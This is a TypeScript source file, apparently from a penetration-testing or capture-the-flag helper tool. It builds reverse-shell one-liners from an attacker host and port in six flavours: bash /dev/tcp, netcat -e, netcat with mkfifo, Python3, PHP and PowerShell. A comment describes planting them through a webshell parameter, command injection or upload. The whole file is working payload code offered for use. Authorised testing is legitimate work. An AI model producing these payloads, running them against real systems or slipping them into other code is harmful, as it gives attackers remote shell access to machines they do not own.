export type ShellPayloadKind =
  "bash" | "nc-mkfifo" | "nc-e" | "python3" | "php" | "powershell";

export const SHELL_PAYLOAD_KINDS: { id: ShellPayloadKind; label: string }[] = [
  { id: "nc-mkfifo", label: "netcat (mkfifo, -e 없는 netcat용)" },
  { id: "nc-e", label: "netcat -e" },
  { id: "bash", label: "Bash (/dev/tcp)" },
  { id: "python3", label: "Python3" },
  { id: "php", label: "PHP" },
  { id: "powershell", label: "PowerShell" },
];

// Standard, widely-published one-liners (pentestmonkey-style cheat sheet) —
// getting one of these onto the RCE point (webshell param, command
// injection, upload) is close to universal across every box, so this is
// text generation only; nothing here executes anything itself.
export function buildReverseShellPayload(
  kind: ShellPayloadKind, lhost: string, lport: string,
): string {
  switch (kind) {
    case "bash":
      return `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
    case "nc-e":
      return `nc -e /bin/sh ${lhost} ${lport}`;
    case "nc-mkfifo":
      return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`;
    case "python3":
      return `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));` +
        `[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'`;
    case "php":
      return `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`;
    case "powershell":
      return `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});` +
        `$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){` +
        `$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);` +
        `$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);` +
        `$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`;
    default:
      return "";
  }
}
